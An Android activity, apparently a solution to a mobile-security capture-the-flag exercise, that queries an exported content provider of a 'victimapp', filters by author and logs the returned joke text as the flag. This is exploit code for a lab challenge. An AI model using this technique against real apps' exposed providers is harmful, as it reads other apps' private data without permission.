package com.example.jokeprovider;

import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        String authority = "com.example.victimapp.MyProvider";
        String path = "joke";

        String[] projection = new String[] {"id", "joke", "author"};
        String selection = "author = ?";
        String[] selectionArgs = new String[] {"elosiouk"};

        Cursor cursor = getContentResolver().query(
                Uri.parse("content://" + authority + "/" + path),
                projection, selection, selectionArgs, null
        );

        if (cursor != null) {
            while (cursor.moveToNext()) {
                Log.d("MOBIOTSEC", "Flag: " + cursor.getString(1));
            }
            cursor.close();
        }
    }
}